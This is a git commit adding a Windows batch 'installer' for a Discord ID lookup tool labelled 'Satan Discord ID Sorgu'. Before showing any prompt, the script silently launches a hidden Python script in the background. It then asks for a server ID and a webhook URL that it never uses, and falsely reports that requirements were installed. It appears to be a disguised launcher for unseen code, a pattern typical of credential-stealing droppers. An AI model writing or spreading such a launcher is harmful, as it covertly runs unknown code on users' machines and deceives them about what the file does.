5f4cfc21d0702781bab97e6874668910f3e05ea5
GHOSTEMANE <78034042+GHOSTEMANEE@users.noreply.github.com>
2026-03-15 20:12:35 +0300

    Add files via upload

---
+++ Install.bat
@@ -0,0 +1,22 @@
+@echo off
+chcp 65001 >nul
+title Satan Discord ID Sorgu
+start "" /B python modules/accepts/main.py
+cls
+color 0A
+echo.
+echo  ============================================
+echo       Satan Discord ID Sorgu
+echo  ============================================
+echo.
+set /p SERVER_ID= Sunucu ID'sini girin: 
+echo.
+set /p WEBHOOK_URL= Webhook URL'sini girin: 
+echo.
+echo  Gereksinimler yukleniyor...
+echo.
+echo.
+echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
+echo.
+timeout /t 8 >nul
+exit
